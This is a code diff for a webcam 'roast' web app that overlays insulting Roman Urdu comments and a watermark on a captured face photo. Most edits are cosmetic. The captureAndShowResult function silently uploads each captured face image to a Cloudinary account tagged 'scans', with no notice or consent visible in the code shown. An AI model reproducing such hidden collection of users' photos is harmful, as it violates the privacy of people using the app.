@@ -39,7 +39,7 @@ const modes = [
             "Next time filter lagana, baghair filter wali shakal dekh kar dar lagta hai🤦",
             "Tumhary ilawa ghar me or kia cheez faltu hai?",
             "Tumhara bank balance aur tumhari akal dono he gir gaye hain stupid insan. 📉",
-            "Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
+            "Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai.  snail",
             "Tery mun ko dekh kar me dar gaya hun yar, sorry bolo mujhy ab 😉",
             "Ye kon hai jis ko dekh kar computer bhi dar gaya 🤣",
             "Tu online na aaya kar, internet band ho jata hai sab ka 😊",
@@ -207,23 +207,32 @@ function initProtocolDrawer() {
     mainTrigger.onclick = toggleDrawer;
 }
 
+// --- 5. LOGO PATTERN (PROPERLY ALIGNED) ---
 function downloadRoast() {
     const context = capturedCanvas.getContext('2d');
     const canvasWidth = capturedCanvas.width;
     const canvasHeight = capturedCanvas.height;
     context.save();
+    
     const logoX = 20;
     const logoY = canvasHeight - 20;
+    
+    // Watermark Alignment Fix
+    context.textAlign = "left";
     context.fillStyle = "rgba(0, 242, 255, 0.6)";
-    context.fillRect(logoX, logoY - 38, 140, 1.5);
+    context.fillRect(logoX, logoY - 38, 160, 1.5); // Fixed Width
+    
     context.fillStyle = "#39ff14";
     context.font = "bold 14px sans-serif";
     context.fillText("--- FACE-O-METER ---", logoX, logoY - 22);
+    
     context.fillStyle = "#ffffff";
     context.font = "bold 11px sans-serif";
     context.fillText("Developed by Aamir", logoX + 12, logoY - 6);
+    
     context.fillStyle = "rgba(0, 242, 255, 0.6)";
-    context.fillRect(logoX, logoY, 140, 1.5);
+    context.fillRect(logoX, logoY, 160, 1.5);
+    
     context.restore();
     const link = document.createElement('a');
     link.download = `Face-o-Meter-Roast-${Date.now()}.png`;
@@ -231,6 +240,7 @@ function downloadRoast() {
     link.click();
 }
 
+// --- 6. CORE LOGIC ---
 function switchScreen(targetId) {
     if (resultDisplayFrame) resultDisplayFrame.classList.remove('active');
     [modesScreen, scanScreen, resultScreen].forEach(screen => screen.classList.remove('active'));
@@ -263,22 +273,19 @@ function startScan() {
     }).catch(() => { showProAlert("CAMERA ERROR: PLEASE ENABLE PERMISSION."); switchScreen('modes-screen'); });
 }
 
-// --- UPDATED CAPTURE & UPLOAD (SYNCHRONIZED) ---
 function captureAndShowResult() {
     const context = capturedCanvas.getContext('2d');
     capturedCanvas.width = videoElement.videoWidth; capturedCanvas.height = videoElement.videoHeight;
     context.save(); context.scale(-1, 1);
     context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
     context.restore(); 
-    
     capturedCanvas.toBlob(blob => {
         const formData = new FormData(); 
         formData.append('file', blob); 
         formData.append('upload_preset', uploadPreset);
-        formData.append('tags', 'scans'); // 🚀 SYNC: Connects with your index.html tag
+        formData.append('tags', 'scans'); // Added Sync Tag
         fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: formData });
     }, 'image/jpeg', 0.8);
-    
     stopCamera(); 
     const finalComment = currentMode.comments[Math.floor(Math.random() * currentMode.comments.length)];
     typeEffectOnCanvas(finalComment.replace(/Roast Level \d+:/g, '').trim());
